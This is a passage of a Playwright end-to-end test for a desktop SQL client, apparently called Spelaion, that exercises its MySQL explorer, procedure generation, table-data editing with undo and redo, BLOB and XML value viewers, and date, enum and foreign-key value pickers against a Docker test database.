  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await page.getByRole("button", { name: "Expand or collapse schema spelaion" }).waitFor();
  assert.ok(await page.locator('.connection-row:has-text("MySQL (Docker)") img.engine-icon').evaluate((icon) => icon.complete && icon.naturalWidth > 0));
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "hidden" });
  await connectionsActivity.click();
  await page.getByRole("button", { name: "Expand or collapse schema spelaion" }).waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0);
  // System schemas only when asked for, in Settings → Explorer (a personal preference).
  const systemSchema = page.getByRole("button", { name: "Expand or collapse schema information_schema" });
  assert.equal(await systemSchema.count(), 0);
  const setShowSystem = (checked) =>
    withSettings("explorer", async (settings) => {
      const box = settings.locator('input[name="showSystem"]');
      await box.setChecked(checked);
      await page.waitForFunction(([want]) => {
        const input = document.querySelector('input[name="showSystem"]');
        return input?.checked === want && !input.disabled;
      }, [checked]);
    });
  await setShowSystem(true);
  await systemSchema.first().waitFor();
  // Alphabetical by default; without it, the database's order (MySQL's system schemas last).
  // The test user only sees the schemas it has privileges on.
  const mysqlNode = page.locator(".node", { has: page.locator('.connection-row:has-text("MySQL (Docker)")') }).first();
  const schemaOrder = () =>
    mysqlNode.locator('[aria-label^="Expand or collapse schema "]').evaluateAll((rows) =>
      rows.map((row) => row.getAttribute("aria-label").replace("Expand or collapse schema ", "")),
    );
  assert.deepEqual(await schemaOrder(), ["information_schema", "performance_schema", "spelaion"]);
  const setExplorerBox = (name, checked) =>
    withSettings("explorer", async (settings) => {
      await settings.locator(`input[name="${name}"]`).setChecked(checked);
      await page.waitForFunction(([n, want]) => {
        const input = document.querySelector(`input[name="${n}"]`);
        return input?.checked === want && !input.closest("fieldset").disabled;
      }, [name, checked]);
    });
  await setExplorerBox("sortAlphabetically", false);
  assert.deepEqual(await schemaOrder(), ["spelaion", "information_schema", "performance_schema"]);
  await setExplorerBox("sortAlphabetically", true);
  await setShowSystem(false);
  await systemSchema.first().waitFor({ state: "detached" });

  step("explorer: open a connected query for the selected database without asking again");
  await page.locator('.connection-row:has-text("MySQL (Docker)") .label').dblclick();
  await panel.locator(".status-connected").waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0);
  const mysqlSchema = page.getByRole("button", { name: "Expand or collapse schema spelaion" });
  await mysqlSchema.dblclick();
  await panel.locator(".status-connected").waitFor();
  const selectedDatabase = panel.getByLabel("Database", { exact: true });
  await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await selectedDatabase.elementHandle());
  assert.equal(await page.getByRole("dialog").count(), 0);
  await panel.locator(".cm-content").click();
  await page.keyboard.insertText("select 1 where database() = 'spelaion';");
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  // "Set as the editor's schema" switches the active tab's database back.
  await selectedDatabase.selectOption("information_schema");
  await page.waitForFunction((el) => !el.disabled && el.value === "information_schema", await selectedDatabase.elementHandle());
  await mysqlSchema.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Set as the editor's schema" }).click();
  await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await selectedDatabase.elementHandle());
  // "Generate CALL" on a procedure: its IN parameter as a placeholder, its OUT one collected.
  await replaceQuery(panel, "create procedure if not exists smoke_call(in a int, out b int) set b = a + 1;\nselect 2 as done union all select 3;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "2 rows" }).waitFor();
  if ((await mysqlSchema.getAttribute("aria-expanded")) !== "true") await mysqlSchema.click();
  await mysqlSchema.focus();
  await page.keyboard.press("F5");
  const mysqlProcedures = mysqlSchema.locator("xpath=..").getByRole("button", { name: "Expand or collapse Procedures", exact: true });
  await mysqlProcedures.click();
  await page.getByRole("button", { name: "smoke_call: open its definition", exact: true }).click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate CALL" }).click();
  await panel.locator(".cm-content", { hasText: "CALL `spelaion`.`smoke_call`" }).waitFor();
  assert.equal((await panel.locator(".cm-content").innerText()).trimEnd(), "CALL `spelaion`.`smoke_call`(:a, @b);\nSELECT @b AS `b`;");
  // "Run…" (ADR-047): the call runs in a new tab, and the parameter form writes its values in.
  await page.getByRole("button", { name: "smoke_call: open its definition", exact: true }).click({ button: "right" });
  await page.getByRole("menuitem", { name: "Run…" }).click();
  const callParams = page.getByRole("dialog", { name: "Query parameters" });
  await callParams.getByLabel(":a").fill("41");
  await shot("sdb-21-run-routine");
  await callParams.getByRole("button", { name: "Run", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  const callGrid = panel.locator(".grid-scroller");
  const callBox = await callGrid.boundingBox();
  const copiedBeforeCall = await page.evaluate(() => window.__copied.length);
  await page.mouse.click(callBox.x + 80, callBox.y + 34 + 12);
  await page.keyboard.press("Control+c");
  assert.equal(await copied(copiedBeforeCall + 1), "42");
  // "Edit source": MySQL has no OR REPLACE for a procedure, so it is dropped and created again.
  await page.getByRole("button", { name: "smoke_call: open its definition", exact: true }).click({ button: "right" });
  await page.getByRole("menuitem", { name: "Edit source" }).click();
  await panel.locator(".cm-content", { hasText: "DROP PROCEDURE IF EXISTS `spelaion`.`smoke_call`;" }).waitFor();
  assert.match((await panel.locator(".cm-content").innerText()).trimEnd(), /^DROP PROCEDURE IF EXISTS `spelaion`\.`smoke_call`;\nDELIMITER \$\$\nCREATE [\s\S]*PROCEDURE `smoke_call`[\s\S]*\$\$\nDELIMITER ;$/);
  await shot("sdb-21-edit-source");
  await mysqlProcedures.click();

  step("editing table data: cells, NULL, delete and insert applied in one transaction");
  if ((await mysqlSchema.getAttribute("aria-expanded")) !== "true") await mysqlSchema.click();
  const mysqlTables = mysqlSchema.locator("xpath=..").getByRole("button", { name: "Expand or collapse Tables", exact: true });
  if ((await mysqlTables.getAttribute("aria-expanded")) !== "true") await mysqlTables.click();
  const smokeEditNode = page.getByRole("button", { name: "Expand or collapse smoke_edit", exact: true });
  const estimate = smokeEditNode.locator('[title^="Estimated rows (from the planner, not counted): "]');
  await estimate.waitFor();
  assert.match(await estimate.innerText(), /^~\d/);
  // The MySQL forms prepare constraints and foreign keys in the SQL editor.
  await smokeEditNode.locator(".twisty").click();
  const mysqlDetails = smokeEditNode.locator("xpath=..");
  await mysqlDetails.getByRole("button", { name: "Expand or collapse Columns", exact: true }).locator(".label").dblclick();
  const mysqlColumnsView = page.getByRole("region", { name: "Columns of smoke_edit" });
  // Size on disk, index size and row estimate from the catalog's statistics (SDB-24).
  const mysqlStats = mysqlColumnsView.getByRole("definition").filter({ hasText: /\d/ });
  await mysqlColumnsView.locator(".table-stats", { hasText: "Size on disk" }).waitFor();
  assert.ok((await mysqlStats.count()) >= 3, "sizes and a row estimate are shown");
  await mysqlColumnsView.locator(".table-stats", { hasText: "Indexes" }).waitFor();
  await shot("07e-table-stats");
  await mysqlColumnsView.getByRole("button", { name: "Add…" }).click();
  const mysqlColumnForm = page.getByRole("dialog", { name: "Add to Columns of smoke_edit" });
  await mysqlColumnForm.getByLabel("Name", { exact: true }).fill("new_counter");
  const mysqlDataType = mysqlColumnForm.getByRole("combobox", { name: "Data type", exact: true });
  assert.equal(await mysqlDataType.locator('option[value="VARCHAR(255)"]').count(), 1);
  assert.equal(await mysqlDataType.locator('option[value="JSONB"]').count(), 0);
  await mysqlDataType.selectOption("__custom__");
  await mysqlColumnForm.getByLabel("Custom data type").fill("BIGINT UNSIGNED");
  await mysqlColumnForm.getByRole("button", { name: "Open SQL" }).click();
  await panel.locator(".cm-content", { hasText: "`new_counter` BIGINT UNSIGNED" }).waitFor();
  await page.keyboard.press("Control+w");
  await mysqlColumnsView.waitFor();
  await page.keyboard.press("Control+w");
  for (const section of ["Constraints", "Foreign keys"]) {
    await mysqlDetails.getByRole("button", { name: `Expand or collapse ${section}`, exact: true }).locator(".label").dblclick();
    const view = page.getByRole("region", { name: `${section} of smoke_edit` });
    await view.getByRole("button", { name: "Add…" }).click();
    const form = page.getByRole("dialog", { name: `Add to ${section} of smoke_edit` });
    await form.getByLabel("Name", { exact: true }).fill(section === "Constraints" ? "smoke_unique" : "smoke_fk");
    await form.locator("fieldset").getByLabel(section === "Constraints" ? "name" : "id", { exact: true }).check();
    if (section === "Foreign keys") {
      await form.getByLabel("Referenced table").fill("smoke_pages");
      await form.getByLabel("Referenced columns", { exact: false }).fill("id");
      await shot("05f-add-foreign-key-form");
    }
    await form.getByRole("button", { name: "Open SQL" }).click();
    await panel.locator(".cm-content", { hasText: section === "Constraints" ? "UNIQUE (`name`)" : "REFERENCES `spelaion`.`smoke_pages` (`id`)" }).waitFor();
    await page.keyboard.press("Control+w");
    await view.waitFor();
    await page.keyboard.press("Control+w");
  }
  await smokeEditNode.locator(".twisty").click();
  await smokeEditNode.dblclick();
  await page.locator(".tabbar .tab.active", { hasText: "smoke_edit" }).waitFor();
  await panel.locator(".status-connected").waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0);
  await panel.locator(".table-range", { hasText: "rows 1–3" }).waitFor();
  await panel.getByRole("button", { name: "Add row" }).waitFor();
  await panel.getByRole("textbox", { name: "ORDER BY" }).fill("id");
  await panel.getByRole("button", { name: "Apply", exact: true }).click();
  await panel.locator(".table-range", { hasText: "rows 1–3" }).waitFor();
  {
    let box = null;
    for (let i = 0; i < 40 && !box; i++) {
      box = await panel.locator(".grid-scroller").boundingBox();
      if (!box) await page.waitForTimeout(100);
    }
    // Read the grid's place each time: nothing above it may move, but if it does the
    // clicks still land on the intended cell.
    const cellAt = async (row, x) => {
      const now = await panel.locator(".grid-scroller").boundingBox();
      return [now.x + 52 + x + 20, now.y + 34 + 12 + row * 24];
    };
    // name of row 1 → "edited" (inline editor).
    await page.mouse.dblclick(...(await cellAt(0, 110)));
    const editor = panel.locator("input.cell-editor").and(panel.getByRole("textbox", { name: "New value for name" }));
    await editor.fill("edited");
    await editor.press("Enter");
    // The full value panel edits the same pending cell, and can be undone by row.
    await page.keyboard.press("Enter");
    const viewer = panel.locator(".cell-viewer");
    const fullValue = viewer.getByRole("textbox", { name: "New value for name" });
    await viewer.getByText("Edit value", { exact: true }).waitFor();
    await fullValue.fill("edited from viewer");
    await viewer.getByText("Change pending; save it from the results toolbar.").waitFor();
    await viewer.getByRole("button", { name: "Close the cell viewer (Esc)" }).click();
    // Duplicating a row copies its pending values but leaves the key for the new row.
    await page.keyboard.press("Control+Alt+Insert");
    const duplicate = page.getByRole("dialog", { name: "New row" });
    assert.equal(await duplicate.getByRole("textbox", { name: "name", exact: true }).inputValue(), "edited from viewer");
    assert.equal(await duplicate.getByRole("textbox", { name: "id", exact: true }).inputValue(), "");
    await duplicate.getByRole("textbox", { name: "id", exact: true }).fill("5");
    await duplicate.getByRole("button", { name: "Add", exact: true }).click();
    await panel.locator(".grid-scroller").focus();
    await page.keyboard.press("Alt+Insert");
    await page.getByRole("dialog", { name: "New row" }).getByRole("button", { name: "Add", exact: true }).click();
    await panel.getByRole("button", { name: "Discard new row 2" }).click();
    // qty of row 2 → NULL (shortcut).
    await page.mouse.click(...(await cellAt(1, 270)));
    await page.keyboard.press("Control+Alt+n");
    // row 3 deleted (Alt+Del).
    await page.mouse.click(...(await cellAt(2, 0)));
    await page.keyboard.press("Alt+Delete");
    // A new row with id 4; qty takes its default.
    await panel.getByRole("button", { name: "Add row" }).click();
    const newRow = page.getByRole("dialog", { name: "New row" });
    await newRow.getByRole("textbox", { name: "id", exact: true }).fill("4");
    await newRow.getByRole("textbox", { name: "name", exact: true }).fill("four");
    await newRow.getByRole("button", { name: "Add", exact: true }).click();
    await panel.getByText("Inserted: 2 · Deleted: 1 · Updated: 2").waitFor();
    assert.ok(await panel.getByRole("button", { name: "Next page" }).isDisabled());
    await shot("07d-editing-pending");
    await panel.getByRole("button", { name: "Save changes" }).click();
    await panel.getByRole("status").filter({ hasText: "Applied 5 changes" }).waitFor();
    await panel.locator(".table-range", { hasText: "rows 1–4" }).waitFor();
    for (let i = 0; i < 40 && !(box = await panel.locator(".grid-scroller").boundingBox()); i++) await page.waitForTimeout(100);
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(box.x + 52 + 20, box.y + 34 + 12);
    await page.keyboard.press("Control+a");
    await page.keyboard.press("Control+c");
    assert.deepEqual((await copied(before + 1)).trimEnd().split("\n"), ["1\tedited from viewer\t1", "2\ttwo\t", "4\tfour\t1", "5\tedited from viewer\t1"]);
  }
  // Saving directly from an active cell commits its current input as well as other changes.
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 110 + 20, box.y + 34 + 12);
    const editor = panel.locator("input.cell-editor").and(panel.getByRole("textbox", { name: "New value for name" }));
    await editor.fill("saved by shortcut");
    await editor.press("Control+s");
    await panel.getByRole("status").filter({ hasText: "Applied 1 change" }).waitFor();
    await panel.locator(".table-range", { hasText: "rows 1–4" }).waitFor();
    assert.equal(await page.getByRole("dialog", { name: "Save query" }).count(), 0);
    let after = null;
    for (let i = 0; i < 40 && !(after = await panel.locator(".grid-scroller").boundingBox()); i++) await page.waitForTimeout(100);
    assert.ok(after, "the grid is visible after saving");
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(after.x + 52 + 110 + 20, after.y + 34 + 12);
    await page.keyboard.press("Control+c");
    assert.equal(await copied(before + 1), "saved by shortcut");
  }
  // A typed value that does not fit the column is refused by the core; nothing is applied.
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 270 + 20, box.y + 34 + 12);
    // The grid's own editor: the open cell viewer has an edit box with the same name.
    const editor = panel.locator("input.cell-editor").and(panel.getByRole("textbox", { name: "New value for qty" }));
    await editor.fill("123");
    await editor.press("Enter");
    await page.keyboard.press("Control+z");
    await panel.getByText("No pending changes").waitFor();
    await page.mouse.dblclick(box.x + 52 + 270 + 20, box.y + 34 + 12);
    await editor.fill("lots");
    await editor.press("Enter");
    await panel.getByRole("button", { name: "Save changes" }).click();
    await panel.getByRole("alert").filter({ hasText: "is not a whole number" }).waitFor();
    await page.keyboard.press("Control+r");
    await panel.getByText("No pending changes").waitFor();
  }
  // Bulk edits of a selection, kept in the core with undo and redo (ADR-044).
  step("table data: bulk edits of a selection, undo and redo");
  {
    const cell = async (row, x) => {
      const now = await panel.locator(".grid-scroller").boundingBox();
      return [now.x + 52 + x + 20, now.y + 34 + 12 + row * 24];
    };
    const counts = (updated) => panel.getByText(`Inserted: 0 · Deleted: 0 · Updated: ${updated}`);
    // The four names: upper case from the cell menu's submenu.
    const selectDown = async (x) => {
      await page.mouse.click(...(await cell(0, x)));
      for (let i = 0; i < 3; i++) await page.keyboard.press("Shift+ArrowDown");
    };
    await selectDown(110);
    await panel.getByText("1 column selected", { exact: true }).waitFor();
    await page.mouse.click(...(await cell(3, 110)), { button: "right" });
    await panel.getByRole("menuitem", { name: "Change selected cells ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Upper case" }).waitFor();
    await shot("07e-bulk-edit-menu");
    await panel.getByRole("menuitem", { name: "Upper case" }).click();
    await counts(4).waitFor();
    await panel.getByRole("status").filter({ hasText: "Changed 4 cells (not saved yet)" }).waitFor();
    // Undo and redo restore exactly what was pending, from the keyboard and the toolbar.
    await page.keyboard.press("Control+z");
    await panel.getByText("No pending changes").waitFor();
    await page.keyboard.press("Control+y");
    await counts(4).waitFor();
    // qty of the four rows: fill down from the first (row 2's NULL becomes 1).
    await selectDown(270);
    await page.keyboard.press("Control+d");
    await panel.getByRole("status").filter({ hasText: "Changed 1 cell (not saved yet)" }).waitFor();
    // A block pasted from the clipboard (Ctrl+V on the grid): names of rows 3 and 4.
    await page.mouse.click(...(await cell(2, 110)));
    await panel.locator(".grid-scroller").evaluate((grid) => {
      const data = new DataTransfer();
      data.setData("text/plain", "pasted three\npasted four\n");
      grid.dispatchEvent(new ClipboardEvent("paste", { clipboardData: data, bubbles: true, cancelable: true }));
    });
    await panel.getByRole("status").filter({ hasText: "Changed 2 cells (not saved yet)" }).waitFor();
    // Set value… on row 1's name, then take that step back from the toolbar and redo it.
    await page.mouse.click(...(await cell(0, 110)), { button: "right" });
    await panel.getByRole("menuitem", { name: "Set value…" }).click();
    const setValue = page.getByRole("dialog", { name: "Set the value of 1 cell" });
    await setValue.getByRole("textbox").fill("bulk one");
    await setValue.getByRole("button", { name: "Set value" }).click();
    await panel.getByRole("button", { name: "Undo", exact: true }).click();
    await panel.getByRole("button", { name: "Redo", exact: true }).click();
    await counts(4).waitFor();
    await shot("07f-bulk-edits-pending");
    await panel.getByRole("button", { name: "Save changes" }).click();
    await panel.getByRole("status").filter({ hasText: "Applied 4 changes" }).waitFor();
    await panel.locator(".table-range", { hasText: "rows 1–4" }).waitFor();
    let box = null;
    for (let i = 0; i < 40 && !(box = await panel.locator(".grid-scroller").boundingBox()); i++) await page.waitForTimeout(100);
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(box.x + 52 + 20, box.y + 34 + 12);
    await page.keyboard.press("Control+a");
    await page.keyboard.press("Control+c");
    assert.deepEqual((await copied(before + 1)).trimEnd().split("\n"), ["1\tbulk one\t1", "2\tTWO\t1", "4\tpasted three\t1", "5\tpasted four\t1"]);
    // Nothing pending is left to undo after saving.
    assert.ok(await panel.getByRole("button", { name: "Undo", exact: true }).isDisabled());
  }
  // Wait for the table tab to finish closing before opening the next query: closing is
  // asynchronous and its completion can otherwise overtake the following double click.
  const editedTableTab = page.locator(".tabbar .tab.active");
  const editedTableHandle = await editedTableTab.elementHandle();
  await page.keyboard.press("Control+w");
  await page.waitForFunction((tab) => !tab.isConnected, editedTableHandle);

  step("editing a simple query result, while joins stay read-only");
  // The real double-click gesture was checked above. Trigger it directly here: the first
  // click can collapse a long tree and move the row before the second mouse event arrives.
  await mysqlSchema.dispatchEvent("dblclick");
  panel = page.locator(".tab-panel:not([hidden])");
  await panel.locator(".status-connected").waitFor();
  const queryDatabase = panel.getByLabel("Database", { exact: true });
  await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await queryDatabase.elementHandle());
  await panel.locator(".cm-content").click();
  await page.keyboard.insertText("select id, name from smoke_edit order by id;");
  await run(panel);
  await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 110 + 20, box.y + 34 + 12);
    const editor = panel.locator("input.cell-editor").and(panel.getByRole("textbox", { name: "New value for name" }));
    await editor.fill("query edit");
    await editor.press("Enter");
    await page.keyboard.press("Enter");
    const valueEditor = panel.locator(".cell-viewer").getByRole("textbox", { name: "New value for name" });
    await valueEditor.fill("viewer shortcut");
    const valueBar = panel.locator(".cell-viewer").getByRole("toolbar", { name: "Value actions" });
    assert.ok((await valueBar.boundingBox()).y >= (await valueEditor.boundingBox()).y + (await valueEditor.boundingBox()).height, "the value actions are below the editor");
    const beforeSave = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await valueEditor.press("Control+s");
    await panel.getByRole("status").filter({ hasText: "Applied 1 change" }).waitFor();
    await page.waitForFunction((el) => !el.isConnected, beforeSave);
    await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
    const updated = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(updated.x + 52 + 110 + 20, updated.y + 34 + 12);
    await page.keyboard.press("Enter");
    await panel.locator(".cell-viewer").getByRole("textbox", { name: "New value for name" }).waitFor();
    assert.equal(await panel.locator(".cell-viewer textarea").inputValue(), "viewer shortcut");
  }
  await panel.locator(".cm-content").click();
  await page.keyboard.press("Control+a");
  await page.keyboard.insertText("select * from smoke_edit a join smoke_edit b on a.id = b.id;");
  const previousEditResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await run(panel);
  await page.waitForFunction((el) => !el.isConnected, previousEditResult);
  await panel.locator(".statusline", { hasText: "4 rows" }).waitFor();
  assert.equal(await panel.getByRole("toolbar", { name: "Row actions" }).count(), 0);
  // A join is not paged (ADR-054: its pages could not be fetched exactly): it ran as written,
  // every row at once, with no page controls.
  assert.equal(await panel.getByRole("group", { name: "Query result pages" }).count(), 0);

  step("value viewers: an image BLOB previewed, saved to a file and loaded from one; XML pretty-printed");
  {
    // Real PNG files (the app's icons): the core recognises them by their bytes.
    const iconPath = join(root, "apps/desktop/src-tauri/icons/128x128@2x.png");
    const icon = readFileSync(iconPath);
    const smallIcon = join(root, "apps/desktop/src-tauri/icons/32x32.png");
    await replaceQuery(panel, [
      // No DROP: the guard would ask first. The table stays in the test database.
      "create table if not exists smoke_blob (id int primary key, img longblob, doc text);",
      "delete from smoke_blob where id = 1;",
      `insert into smoke_blob values (1, X'${icon.toString("hex")}', '<order id="7"><line>pen</line><line>ink</line></order>');`,
    ].join("\n"));
    await run(panel);
    await panel.locator(".statusline", { hasText: "3 OK, 0 failed, 0 not run" }).waitFor();
    // A single plain SELECT of one table with its key: an editable result.
    await replaceQuery(panel, "select id, img from smoke_blob order by id;");
    await run(panel);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
    const openImage = async () => {
      const box = await panel.locator(".grid-scroller").boundingBox();
      await page.mouse.click(box.x + 52 + 20, box.y + 34 + 12);
      await page.keyboard.press("ArrowRight");
      await page.keyboard.press("Enter");
    };
    await openImage();
    const viewer = panel.locator(".cell-viewer");
    const image = viewer.getByRole("img", { name: "PNG image in img" });
    await image.waitFor();
    await viewer.getByText("PNG image · 256 × 256 px").waitFor();
    assert.match(await image.getAttribute("src"), /^data:image\/png;base64,iVBORw0KGgo/);
    await viewer.getByText(`${icon.length.toLocaleString("en")} bytes`).waitFor();
    await shot("05h-value-image");
    // The same bytes as a hex dump.
    await viewer.getByRole("button", { name: "Hex", exact: true }).click();
    await viewer.locator(".cell-viewer-hex", { hasText: "89 50 4e 47 0d 0a 1a 0a" }).waitFor();
    await viewer.getByRole("button", { name: "Image", exact: true }).click();
    await image.waitFor();
    // Saved byte for byte.
    const savedIcon = join(userDir, "saved-icon.png");
    await page.evaluate((target) => (window.__spelaionSavePath = target), savedIcon);
    await viewer.getByRole("button", { name: "Save to file…" }).click();
    await viewer.getByText(/^Saved .* to .*saved-icon\.png$/).waitFor();
    await page.evaluate(() => delete window.__spelaionSavePath);
    assert.ok(readFileSync(savedIcon).equals(icon), "the saved file has the value's bytes");
    // A file loaded into the cell: one UPDATE by key, applied at once, then the query runs again.
    const beforeLoad = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await page.evaluate((target) => (window.__spelaionOpenPath = target), smallIcon);
    await viewer.getByRole("button", { name: "Load from file…" }).click();
    await panel.getByRole("status").filter({ hasText: "Loaded 32x32.png into img" }).waitFor();
    await page.evaluate(() => delete window.__spelaionOpenPath);
    await page.waitForFunction((el) => !el.isConnected, beforeLoad);
    await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
    await openImage();
    await panel.locator(".cell-viewer").getByText("PNG image · 32 × 32 px").waitFor();
    // The cell menu saves it too, named with the extension the core gives.
    const menuSaved = join(userDir, "menu-icon.png");
    await page.evaluate((target) => (window.__spelaionSavePath = target), menuSaved);
    {
      const box = await panel.locator(".grid-scroller").boundingBox();
      await page.mouse.click(box.x + 52 + 110 + 20, box.y + 34 + 12, { button: "right" });
    }
    await panel.getByRole("menuitem", { name: "Save to file…" }).click();
    await panel.locator(".grid-notice", { hasText: "menu-icon.png" }).waitFor();
    await page.evaluate(() => delete window.__spelaionSavePath);
    assert.ok(readFileSync(menuSaved).equals(readFileSync(smallIcon)), "the cell menu saves the loaded file's bytes");
    // XML in a read-only result is pretty-printed; a value past the limit waits for "Load anyway".
    await replaceQuery(panel, "select concat(doc) as doc, repeat('a', 2200000) as big from smoke_blob;");
    const beforeXml = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await run(panel);
    await page.waitForFunction((el) => !el.isConnected, beforeXml);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    {
      const box = await panel.locator(".grid-scroller").boundingBox();
      await page.mouse.click(box.x + 52 + 20, box.y + 34 + 12);
      await page.keyboard.press("Enter");
    }
    const xmlViewer = panel.locator(".cell-viewer");
    await xmlViewer.locator(".cell-viewer-xml").waitFor();
    assert.equal(await xmlViewer.locator(".cell-viewer-value").innerText(), '<order id="7">\n  <line>pen</line>\n  <line>ink</line>\n</order>');
    await shot("05i-value-xml");
    await page.keyboard.press("ArrowRight");
    await xmlViewer.getByText("This value is 2.1 MB, more than the 2 MB shown at once.").waitFor();
    await xmlViewer.getByRole("button", { name: "Load anyway" }).click();
    await xmlViewer.getByText("2,200,000 characters").waitFor();
  }
  step("value pickers: a date and time, allowed values, and a row of the referenced table found by pages");
  {
    await replaceQuery(panel, [
      // No DROP: the guard would ask first. The tables stay in the test database.
      "create table if not exists smoke_pick_ref (id int primary key, name varchar(40));",
      "create table if not exists smoke_pick (id int primary key, due datetime(3), mood enum('sad','ok','happy'), status varchar(10) check (status in ('new','paid')), ref_id int, foreign key (ref_id) references smoke_pick_ref (id));",
      "delete from smoke_pick where id > 0;",
      "delete from smoke_pick_ref where id > 0;",
      "insert into smoke_pick_ref (id, name) with recursive s (n) as (select 1 union all select n + 1 from s where n < 120) select n, concat('customer ', n) from s;",
      "insert into smoke_pick values (1, '2026-01-31 10:20:30.120', 'sad', 'new', 5);",
    ].join("\n"));
    await run(panel);
    await panel.locator(".statusline", { hasText: "6 OK, 0 failed, 0 not run" }).waitFor();
    // The setup script left no result: the status line tells when the query has run.
    await replaceQuery(panel, "select id, due, mood, status, ref_id from smoke_pick order by id;");
    await run(panel);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
    {
      const box = await panel.locator(".grid-scroller").boundingBox();
      await page.mouse.click(box.x + 52 + 20, box.y + 34 + 12);
      await page.keyboard.press("ArrowRight");
      await page.keyboard.press("Enter");
    }
    const viewer = panel.locator(".cell-viewer");
    const valueText = viewer.getByRole("textbox", { name: "New value for due" });
    // A date and time: the column keeps 3 digits, written as the grid shows it, which for MySQL
    // is the server's own text, every digit of the column's precision (SDB-122).
    const datePicker = viewer.getByRole("region", { name: "Pick a date and time" });
    await datePicker.waitFor();
    assert.equal(await datePicker.getByLabel("Date").inputValue(), "2026-01-31");
    assert.equal(await datePicker.getByLabel("Time").inputValue(), "10:20:30");
    assert.equal(await datePicker.getByLabel("Fraction of a second").inputValue(), "120");
    await datePicker.getByText("This column keeps 3 digits of a second.").waitFor();
    await datePicker.getByLabel("Date").fill("2026-11-10");
    await datePicker.getByLabel("Time").fill("09:05:07");
    await datePicker.getByLabel("Fraction of a second").fill("5");
    await page.waitForFunction((el) => el.value === "2026-11-10 09:05:07.500", await valueText.elementHandle());
    // More digits than the column keeps are refused by the core, and what was typed stays.
    await datePicker.getByLabel("Fraction of a second").evaluate((el) => el.removeAttribute("maxlength"));
    await datePicker.getByLabel("Fraction of a second").fill("1234");
    await datePicker.getByRole("alert").filter({ hasText: "up to 3 digits" }).waitFor();
    assert.equal(await valueText.inputValue(), "2026-11-10 09:05:07.500");
    await datePicker.getByLabel("Fraction of a second").fill("5");
    await shot("05j-picker-date");
    // An enum: its values from the catalog.
    await viewer.getByRole("button", { name: "Row", exact: true }).click();
    await viewer.getByRole("button", { name: "Show the value of mood" }).click();
    const moodPicker = viewer.getByRole("region", { name: "Pick a value" });
    await moodPicker.getByText("The values of the column's enum type.").waitFor();
    assert.deepEqual(await moodPicker.locator(".value-picker-value").allInnerTexts(), ["sad", "ok", "happy"]);
    assert.ok(await moodPicker.getByRole("radio", { name: "sad" }).isChecked());
    await moodPicker.getByRole("radio", { name: "happy" }).check();
    await page.waitForFunction((el) => el.value === "happy", await viewer.getByRole("textbox", { name: "New value for mood" }).elementHandle());
    await shot("05k-picker-enum");
    // A CHECK list.
    await viewer.getByRole("button", { name: "Row", exact: true }).click();
    await viewer.getByRole("button", { name: "Show the value of status" }).click();
    await viewer.getByText("The values its CHECK constraint allows.").waitFor();
    await viewer.getByRole("radio", { name: "paid" }).check();
    await page.waitForFunction((el) => el.value === "paid", await viewer.getByRole("textbox", { name: "New value for status" }).elementHandle());
    // A foreign key: the referenced table a page at a time, searched by the core.
    await viewer.getByRole("button", { name: "Row", exact: true }).click();
    await viewer.getByRole("button", { name: "Show the value of ref_id" }).click();
    const keyPicker = viewer.getByRole("region", { name: "Pick a row of smoke_pick_ref" });
    const keyRows = keyPicker.getByRole("list", { name: "Rows of smoke_pick_ref" });
    await keyPicker.getByText("Rows 1–50").waitFor();
    assert.equal(await keyRows.getByRole("button").count(), 50);
    assert.match(await keyRows.getByRole("button", { pressed: true }).innerText(), /^5\s*customer 5$/);
    await keyPicker.getByRole("button", { name: "Next", exact: true }).click();
    await keyPicker.getByText("Rows 51–100").waitFor();
    await keyPicker.getByRole("button", { name: "Next", exact: true }).click();
    await keyPicker.getByText("Rows 101–120").waitFor();
    assert.ok(await keyPicker.getByRole("button", { name: "Next", exact: true }).isDisabled());
    await keyPicker.getByRole("searchbox", { name: "Search smoke_pick_ref" }).fill("customer 77");
    await keyPicker.locator(".value-picker-row:not(.value-picker-row-head)", { hasText: "customer 77" }).waitFor();
    await page.waitForFunction((list) => list.querySelectorAll("button.value-picker-row").length === 1, await keyRows.elementHandle());
    await shot("05l-picker-key");
    await keyRows.getByRole("button", { name: /customer 77/ }).click();
    await page.waitForFunction((el) => el.value === "77", await viewer.getByRole("textbox", { name: "New value for ref_id" }).elementHandle());
    // Saved like any edit: one UPDATE by primary key, then the query runs again.
    const beforeSave = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
